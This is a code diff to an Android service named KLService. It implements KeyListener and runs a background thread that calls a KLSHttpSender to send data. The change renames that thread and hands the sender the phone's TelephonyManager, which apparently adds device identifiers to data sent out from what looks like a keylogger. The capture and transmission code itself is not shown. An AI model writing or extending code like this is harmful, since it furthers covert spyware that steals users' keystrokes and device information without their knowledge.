@@ -21,6 +21,7 @@ import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
 import android.text.Editable;
 import android.text.method.KeyListener;
 import android.util.Log;
@@ -31,7 +32,7 @@ import android.widget.Toast;
 public class KLService extends Service implements KeyListener {
 	//MEMBERS:
 	private int mDebugLevel;
-	private Thread t;
+	private Thread mHttpThread;
 	public static Context mContext;
    	public static boolean rRun;
 	
@@ -55,7 +56,7 @@ public class KLService extends Service implements KeyListener {
 		//Init Required Members:
 		mContext = this;
 		
-		t = new Thread(r);
+		mHttpThread = new Thread(r);
 	
 		//serviceStatus = true;
 		//We go to our logic stuff....
@@ -114,7 +115,7 @@ public class KLService extends Service implements KeyListener {
 	public void KLSlogic() {
     	//Logication ba-rosh...
         //SystemClock.sleep(1000);
-		t.start();
+		mHttpThread.start();
 		
 	}
 	
@@ -122,7 +123,7 @@ public class KLService extends Service implements KeyListener {
     final Runnable r = new Runnable() {
         public void run() {
 		    //Thread Run:
-        	KLSHttpSender sender = new KLSHttpSender();
+        	KLSHttpSender sender = new KLSHttpSender((TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE));
         	//Prepare for a loop(Note to self: Andy requested this..)
         	Looper.prepare();
         	
@@ -144,6 +145,7 @@ public class KLService extends Service implements KeyListener {
         		}
         		
         		//Start Thread Main Code:
+        		
         		sender.sendData();
         		
         		//END Thread Main Code.
